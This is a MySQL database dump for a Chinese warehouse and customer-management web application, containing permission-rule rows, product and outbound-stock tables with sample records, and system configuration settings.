INSERT INTO `xy_auth_rule` VALUES ('385', '2', '384', 'home/custgd/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('386', '2', '384', 'home/custgd/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('387', '2', '384', 'home/custgd/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('388', '2', '384', 'home/custgd/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('389', '2', '384', 'home/custgd/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('390', '1', '369', 'home/hetong/index', '合同管理', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('391', '2', '390', 'home/hetong/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('392', '2', '390', 'home/hetong/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('393', '2', '390', 'home/hetong/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('394', '2', '390', 'home/hetong/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('395', '2', '390', 'home/hetong/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('396', '2', '390', 'home/hetong/shenhe', '审核', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('397', '2', '390', 'home/hetong/dayin', '打印', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('398', '2', '390', 'home/hetong/dshenhe', '待审核', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('399', '1', '369', 'home/hetongs/index', '合同明细表', '1', '1', '', '7');
INSERT INTO `xy_auth_rule` VALUES ('400', '2', '399', 'home/hetongs/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('401', '2', '399', 'home/hetongs/view', '查看', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('402', '2', '365', 'home/ggtxl/outxls', '导出', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('403', '2', '359', 'home/wdtxl/outxls', '导出', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('404', '2', '370', 'home/cust/outxls', '导出', '1', '1', '', '7');
INSERT INTO `xy_auth_rule` VALUES ('405', '2', '390', 'home/hetong/outxls', '导出', '1', '1', '', '8');
INSERT INTO `xy_auth_rule` VALUES ('406', '1', '369', 'home/huifang/index', '客户回访', '1', '1', '', '9');
INSERT INTO `xy_auth_rule` VALUES ('407', '2', '406', 'home/huifang/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('408', '2', '406', 'home/huifang/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('409', '2', '406', 'home/huifang/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('410', '2', '406', 'home/huifang/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('411', '2', '406', 'home/huifang/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('412', '2', '406', 'home/huifang/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('413', '1', '369', 'home/tousu/index', '投诉管理', '1', '1', '', '10');
INSERT INTO `xy_auth_rule` VALUES ('414', '2', '413', 'home/tousu/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('415', '2', '413', 'home/tousu/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('416', '2', '413', 'home/tousu/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('417', '2', '413', 'home/tousu/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('418', '2', '413', 'home/tousu/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('419', '0', '0', 'home/cangku/index', '仓库管理', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('420', '1', '419', 'home/chanpin/index', '产品管理', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('421', '2', '420', 'home/chanpin/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('422', '2', '420', 'home/chanpin/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('423', '2', '420', 'home/chanpin/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('424', '2', '420', 'home/chanpin/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('425', '2', '420', 'home/chanpin/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('426', '2', '420', 'home/chanpin/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('427', '1', '419', 'home/ruku/index', '入库管理', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('428', '2', '427', 'home/ruku/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('429', '2', '427', 'home/ruku/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('430', '2', '427', 'home/ruku/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('431', '2', '427', 'home/ruku/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('432', '2', '427', 'home/ruku/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('433', '2', '427', 'home/ruku/shenhe', '审核', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('434', '2', '427', 'home/ruku/dayin', '打印', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('435', '2', '427', 'home/ruku/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('436', '2', '427', 'home/ruku/dshenhe', '待审核', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('437', '1', '419', 'home/rukus/index', '入库明细表', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('438', '2', '437', 'home/rukus/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('439', '2', '437', 'home/rukus/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('440', '2', '437', 'home/rukus/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('441', '2', '420', 'home/chanpin/baojing', '库存报警', '1', '1', '', '7');
INSERT INTO `xy_auth_rule` VALUES ('442', '1', '419', 'home/chuku/index', '出库管理', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('443', '2', '442', 'home/chuku/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('444', '2', '442', 'home/chuku/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('445', '2', '442', 'home/chuku/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('446', '2', '442', 'home/chuku/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('447', '2', '442', 'home/chuku/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('448', '2', '442', 'home/chuku/shenhe', '审核', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('449', '2', '442', 'home/chuku/dayin', '打印', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('450', '2', '442', 'home/chuku/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('451', '2', '442', 'home/chuku/dshenhe', '待审核', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('452', '1', '419', 'home/chukus/index', '出库明细表', '1', '1', '', '7');
INSERT INTO `xy_auth_rule` VALUES ('453', '2', '452', 'home/chukus/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('454', '2', '452', 'home/chukus/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('455', '2', '452', 'home/chukus/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('456', '1', '419', 'home/fahuo/index', '发货记录', '1', '1', '', '11');
INSERT INTO `xy_auth_rule` VALUES ('457', '2', '456', 'home/fahuo/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('458', '2', '456', 'home/fahuo/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('459', '2', '456', 'home/fahuo/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('460', '2', '456', 'home/fahuo/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('461', '2', '456', 'home/fahuo/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('462', '2', '456', 'home/fahuo/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('463', '0', '0', 'home/caiwu/index', '财务管理', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('464', '1', '463', 'home/shou/index', '收款记录', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('465', '2', '464', 'home/shou/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('466', '2', '464', 'home/shou/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('467', '2', '464', 'home/shou/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('468', '2', '464', 'home/shou/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('469', '2', '464', 'home/shou/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('470', '2', '464', 'home/shou/shenhe', '审核', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('471', '2', '464', 'home/shou/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('472', '2', '464', 'home/shou/dshenhe', '待审核', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('473', '1', '463', 'home/fukuan/index', '付款记录', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('474', '2', '473', 'home/fukuan/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('475', '2', '473', 'home/fukuan/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('476', '2', '473', 'home/fukuan/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('477', '2', '473', 'home/fukuan/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('478', '2', '473', 'home/fukuan/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('479', '2', '473', 'home/fukuan/shenhe', '审核', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('480', '2', '473', 'home/fukuan/dshenhe', '待审核', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('481', '2', '473', 'home/fukuan/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('482', '1', '463', 'home/kaipiao/index', '开票记录', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('483', '2', '482', 'home/kaipiao/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('484', '2', '482', 'home/kaipiao/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('485', '2', '482', 'home/kaipiao/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('486', '2', '482', 'home/kaipiao/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('487', '2', '482', 'home/kaipiao/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('488', '2', '482', 'home/kaipiao/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('489', '1', '1', 'home/public/clear', '清理缓存', '1', '1', '', '20');
INSERT INTO `xy_auth_rule` VALUES ('490', '0', '0', 'home/tongji/index', '统计分析', '1', '1', '', '9');
INSERT INTO `xy_auth_rule` VALUES ('491', '1', '490', 'home/fxcust/index', '客户管理', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('492', '2', '491', 'home/fxcust/xuqiu', '需求分析', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('493', '2', '491', 'home/fxcust/laiyuan', '来源分析', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('494', '2', '491', 'home/fxcust/jinzhan', '进展分析', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('495', '2', '491', 'home/fxcust/yewu', '业务员分析', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('496', '2', '491', 'home/fxcust/qushi', '增长趋势', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('497', '2', '491', 'home/fxcust/', '综合分析', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('498', '1', '490', 'home/fxhetong/index', '合同管理', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('499', '2', '498', 'home/fxhetong/qushi', '增长趋势(数量)', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('500', '2', '498', 'home/fxhetong/qushijin', '签约金额', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('501', '2', '498', 'home/fxhetong/qushishou', '已收款', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('502', '2', '498', 'home/fxhetong/qushiwei', '未收款', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('503', '2', '498', 'home/fxhetong/qushipiao', '已开票', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('504', '2', '498', 'home/fxhetong/type', '类型分析', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('505', '2', '498', 'home/fxhetong/jingban', '业务员分析', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('506', '2', '498', 'home/fxhetong/daoqi', '到期合同', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('507', '1', '490', 'home/fxchanpin/index', '仓库管理', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('508', '2', '507', 'home/fxchanpin/rukus', '入库分析', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('509', '2', '507', 'home/fxchanpin/chukus', '出库分析', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('510', '2', '507', 'home/tjchanpin/index', '库存统计', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('511', '2', '507', 'home/tjchanpin/dayin', '库存统计打印', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('512', '1', '490', 'home/fxcaiwu/index', '财务管理', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('513', '2', '512', 'home/fxcaiwu/shou', '收款分析', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('514', '2', '512', 'home/fxcaiwu/fukuan', '付款分析', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('515', '2', '512', 'home/fxcaiwu/leixing', '付款类型', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('516', '2', '512', 'home/fxcaiwu/jingban', '业务员付款分析', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('517', '1', '490', 'home/msgs/index', '消息记录', '1', '1', '', '10');
INSERT INTO `xy_auth_rule` VALUES ('518', '2', '517', 'home/msgs/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('519', '2', '517', 'home/msgs/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('520', '2', '517', 'home/msgs/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('521', '2', '517', 'home/msgs/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('522', '1', '490', 'home/emails/index', '邮件记录', '1', '1', '', '11');
INSERT INTO `xy_auth_rule` VALUES ('523', '2', '522', 'home/emails/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('524', '2', '522', 'home/emails/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('525', '2', '522', 'home/emails/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('526', '2', '522', 'home/emails/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('527', '1', '490', 'home/smss/index', '短信记录', '1', '1', '', '12');
INSERT INTO `xy_auth_rule` VALUES ('528', '2', '527', 'home/smss/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('529', '2', '527', 'home/smss/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('530', '2', '527', 'home/smss/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('531', '2', '527', 'home/smss/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('532', '1', '490', 'home/tjhetong/index', '业绩统计', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('533', '2', '532', 'home/tjhetong/dayin', '打印', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('537', '2', '390', 'home/hetong/daoqi', '到期', '1', '1', '', '8');
INSERT INTO `xy_auth_rule` VALUES ('535', '1', '490', 'home/tjbiao/index', '老板一张表', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('536', '2', '535', 'home/tjbiao/dayin', '打印', '1', '1', '', '0');

-- ----------------------------
-- Table structure for `xy_chanpin`
-- ----------------------------
DROP TABLE IF EXISTS `xy_chanpin`;
CREATE TABLE `xy_chanpin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(100) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `fenlei` varchar(50) NOT NULL,
  `type` varchar(200) NOT NULL,
  `danwei` varchar(20) NOT NULL,
  `rjiage` int(11) NOT NULL,
  `xjiage` int(11) NOT NULL,
  `kucun` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='产品管理';

-- ----------------------------
-- Records of xy_chanpin
-- ----------------------------
INSERT INTO `xy_chanpin` VALUES ('1', '1', '张飞', '2018-03-13 09:28:48', '1', '2018-03-13 09:29:13', '1', '汽车轴承', 'crm', '汽车零件', '', '套', '2000', '6800', '1999', '');
INSERT INTO `xy_chanpin` VALUES ('2', '1', '张飞', '2018-03-13 09:33:47', '1', '2018-03-13 09:36:45', '1', '三元催化器', 'jmg01', '汽车零件', '', '只', '30', '50', '33', '');
INSERT INTO `xy_chanpin` VALUES ('3', '1', '张飞', '2018-03-13 09:33:47', '1', '2018-03-13 09:36:34', '1', '小票打印机', 'sfz01', '软件配套', '', '台', '1000', '1500', '12', '管理客户的');
INSERT INTO `xy_chanpin` VALUES ('4', '1', '张飞', '2018-03-13 09:35:58', '1', '2018-03-13 09:36:25', '1', '空气滤清器', 'CRM01', '汽车零件', '通用', '套', '2000', '5800', '1999', '');
INSERT INTO `xy_chanpin` VALUES ('9', '16', '张飞', '2018-03-13 15:17:25', '16', '2018-03-13 15:17:49', '1', '发动机', 'd', '汽车零件', '', '套', '111', '1', '0', '');
INSERT INTO `xy_chanpin` VALUES ('10', '1', '谭书涛', '2018-03-10 10:58:03', '0', '0000-00-00 00:00:00', '1', '轴承', '2222', '汽车零件', '', 's', '0', '0', '0', 's');
INSERT INTO `xy_chanpin` VALUES ('11', '1', '谭书涛', '2018-03-10 15:05:22', '0', '0000-00-00 00:00:00', '1', 'dd', '123', '软件服务', 'dd', '只', '33', '22', '-1', '');

-- ----------------------------
-- Table structure for `xy_chuku`
-- ----------------------------
DROP TABLE IF EXISTS `xy_chuku`;
CREATE TABLE `xy_chuku` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(50) NOT NULL,
  `number` varchar(50) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `title` varchar(500) NOT NULL,
  `shijian` date NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `hid` varchar(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='出库记录';

-- ----------------------------
-- Records of xy_chuku
-- ----------------------------
INSERT INTO `xy_chuku` VALUES ('5', '1', '谭书涛', '2018-03-13 08:53:46', '0', '', '0000-00-00 00:00:00', '1', '', '180313460001', '1', 'dd', '2018-03-13', '谭书涛', '谭书涛', '审核通过', '');
INSERT INTO `xy_chuku` VALUES ('6', '1', '谭书涛', '2018-03-13 11:17:15', '0', '', '0000-00-00 00:00:00', '1', '', '180313150002', '0', 'dd', '2018-03-14', '谭书涛', '', '等待审核', '');

-- ----------------------------
-- Table structure for `xy_chukus`
-- ----------------------------
DROP TABLE IF EXISTS `xy_chukus`;
CREATE TABLE `xy_chukus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(100) NOT NULL,
  `title` varchar(200) NOT NULL,
  `type` varchar(255) NOT NULL,
  `danwei` varchar(21) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `xid` int(11) NOT NULL,
  `edit` tinyint(1) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shijian` date NOT NULL,
  `fenlei` varchar(50) NOT NULL,
  `hid` int(11) NOT NULL,
  `number` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8 COMMENT='出库明细表';

-- ----------------------------
-- Records of xy_chukus
-- ----------------------------
INSERT INTO `xy_chukus` VALUES ('9', '1', '123', 'dd', 'dd', '只', '1', '', '审核通过', '5', '0', '谭书涛', '2018-03-13', '软件服务', '0', '');
INSERT INTO `xy_chukus` VALUES ('10', '1', '123', 'dd', 'dd', '只', '0', 'ds', '等待审核', '6', '0', '谭书涛', '2018-03-14', '软件服务', '0', '');

-- ----------------------------
-- Table structure for `xy_config`
-- ----------------------------
DROP TABLE IF EXISTS `xy_config`;
CREATE TABLE `xy_config` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `fenlei` varchar(20) NOT NULL COMMENT '分类',
  `name` varchar(30) NOT NULL DEFAULT '' COMMENT '配置名称',
  `type` tinyint(3) NOT NULL DEFAULT '0' COMMENT '配置类型',
  `title` varchar(50) NOT NULL DEFAULT '' COMMENT '配置说明',
  `extra` varchar(255) NOT NULL DEFAULT '' COMMENT '配置值',
  `remark` varchar(100) NOT NULL COMMENT '配置说明',
  `addtime` datetime NOT NULL COMMENT '创建时间',
  `updatetime` datetime NOT NULL COMMENT '更新时间',
  `status` tinyint(4) NOT NULL DEFAULT '1' COMMENT '状态',
  `value` text NOT NULL COMMENT '配置值',
  `sort` smallint(3) NOT NULL DEFAULT '0' COMMENT '排序',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=69 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_config
-- ----------------------------
INSERT INTO `xy_config` VALUES ('1', '系统', 'CONFIG_TYPE_LIST', '3', '配置类型列表', '', '主要用于数据解析和页面表单的生成', '2015-02-01 14:39:41', '2015-02-25 10:44:48', '1', '0:数字\n1:字符\n2:文本\n3:数组\n4:枚举', '0');
INSERT INTO `xy_config` VALUES ('2', '基础', 'PERPAGE', '0', '每页条数', '', '列表分页条数', '2015-02-01 14:49:47', '2015-06-02 12:00:53', '1', '50', '0');
INSERT INTO `xy_config` VALUES ('3', '基础', 'SEARCHKEY', '3', '参与搜索的字段名', '', '', '2015-02-01 14:56:03', '2015-05-31 16:46:34', '1', 'title\nbiaoti\nmingcheng\nname\nvalue\nxingming\ndianhua\nphone\ntel\nqq\nemail\nbeizhu\nlaiyuan\njinzhan\nsfz\ncontent\nusername\nuname\nuuname\nurl\nip\ntruename\ndepname\nposname\ntype\nleixing\ndanwei\nzhiwei\ncontent\nneirong\njinban\njingban\nshenhe\nshenheren\nbianhao\nnumber', '0');
INSERT INTO `xy_config` VALUES ('4', '系统', 'DATA_CACHE_TIME', '0', '数据缓存时间', '', '数据缓存有效期 0表示永久缓存', '2015-02-01 15:05:20', '2015-02-25 10:44:23', '1', '14400', '0');
INSERT INTO `xy_config` VALUES ('5', '系统', 'SESSION_PREFIXX', '1', 'session 前缀', '', '', '2015-02-01 15:07:09', '2015-02-25 10:44:17', '1', 'lygxykj', '0');
INSERT INTO `xy_config` VALUES ('6', '系统', 'WEB_SITE_TITLE', '2', '系统名称', '', '', '2015-02-01 15:17:46', '2015-07-19 18:48:56', '1', '仓库管理系统', '0');
INSERT INTO `xy_config` VALUES ('11', '模型', 'MODEL_B_SHOW', '3', '字段模型表单显示', '', '', '2015-02-01 22:12:54', '2015-02-25 10:43:02', '1', '0:不显示\n1:都显示\n2:新增显示\n3:编辑显示', '0');
INSERT INTO `xy_config` VALUES ('7', '系统', 'DATA_BACKUP_PATH', '1', '数据库备份路径', '', '', '2015-02-01 15:55:43', '2015-07-07 09:18:30', '1', 'data', '0');
INSERT INTO `xy_config` VALUES ('8', '系统', 'DATA_BACKUP_PART_SIZE', '0', '数据库备份卷大小', '', '该值用于限制压缩后的分卷最大长度。单位：B；建议设置20M', '2015-02-01 15:56:41', '2015-02-25 10:44:00', '1', '20971520', '0');
INSERT INTO `xy_config` VALUES ('9', '系统', 'DATA_BACKUP_COMPRESS', '4', '数据库备份文件是否启用压缩', '0:不压缩\n1:启用压缩', '压缩备份文件需要PHP环境支持gzopen,gzwrite函数', '2015-02-01 15:57:49', '2015-07-07 05:24:13', '1', '1', '0');
INSERT INTO `xy_config` VALUES ('10', '系统', 'DATA_BACKUP_COMPRESS_LEVEL', '4', '数据库备份文件压缩级别', '1:普通\n4:一般\n9:最高', '数据库备份文件的压缩级别，该配置在开启压缩时生效', '2015-02-01 15:58:48', '2015-02-25 10:43:25', '1', '9', '0');
INSERT INTO `xy_config` VALUES ('12', '模型', 'MODEL_L_SHOW', '3', '字段模型列表显示', '', '', '2015-02-02 14:55:31', '2015-02-25 10:42:53', '1', '0:不显示\n1:显示', '0');
INSERT INTO `xy_config` VALUES ('13', '模型', 'MODEL_B_ATTR', '3', '数据模型中表单属性', '', '', '2015-02-02 15:46:08', '2015-04-15 18:16:56', '1', '0:文本框\n1:文本域\n2:密码框\n3:日期框\n4:编辑器\n5:微调器\n6:单选框\n7:多选框\n8:下拉框\n9:查找带回\n10:上传附件\n11:日期时间框\n12:隐藏字段', '0');
INSERT INTO `xy_config` VALUES ('14', '模型', 'MODEL_B_ISMUST', '3', '数据模型中是否必填', '', '', '2015-02-02 16:05:26', '2015-02-28 11:37:48', '1', '0:非必填\n1:必填\n2:必填日期\n3:必填手机号码\n4:必填EMAIL\n5:必填字母\n6:必填身份证号码\n7:必填中文\n8:必填数字\n9:必填日期时间', '0');
INSERT INTO `xy_config` VALUES ('15', '模型', 'MODEL_B_ISSORT', '3', '数据模型中的字段是否参与排序', '', '', '2015-02-02 19:53:07', '2015-02-25 10:42:27', '1', '0:不参与\n1:参与', '0');
INSERT INTO `xy_config` VALUES ('16', '基础', 'BASE_SEX', '3', '性别', '', '', '2015-02-02 21:21:58', '2015-02-25 10:28:07', '1', '0:男\n1:女', '0');
INSERT INTO `xy_config` VALUES ('17', '基础', 'BASE_XUELI', '3', '学历', '', '', '2015-02-02 21:23:26', '2015-02-25 10:28:01', '1', '0:中专\n1:大专\n2:本科\n3:硕士\n4:博士', '0');
INSERT INTO `xy_config` VALUES ('18', '基础', 'CONFIG_CLASS', '3', '配置分类', '', '', '2015-02-25 10:22:21', '2015-05-13 15:31:07', '1', '0:系统\n1:基础\n2:模型', '0');
INSERT INTO `xy_config` VALUES ('41', '模型', 'MODEL_B_ISSEARCH', '3', '模型中是否参与搜索', '', '', '2015-04-16 09:18:09', '0000-00-00 00:00:00', '1', '0:不参与\n1:参与', '0');
INSERT INTO `xy_config` VALUES ('39', '系统', 'WEB_COMPANY_NAME', '2', '单位名称', '', '', '2015-04-05 11:26:27', '2015-07-07 12:13:09', '1', '企业零件仓库', '0');
INSERT INTO `xy_config` VALUES ('38', '模型', 'MODEL_F_TYPE', '3', '图表类型', '', '', '2015-03-06 14:16:26', '0000-00-00 00:00:00', '1', '0:不生成\n1:3D饼图\n2:柱状图\n3:曲线图\n4:环状图\n5:柱商务图', '0');
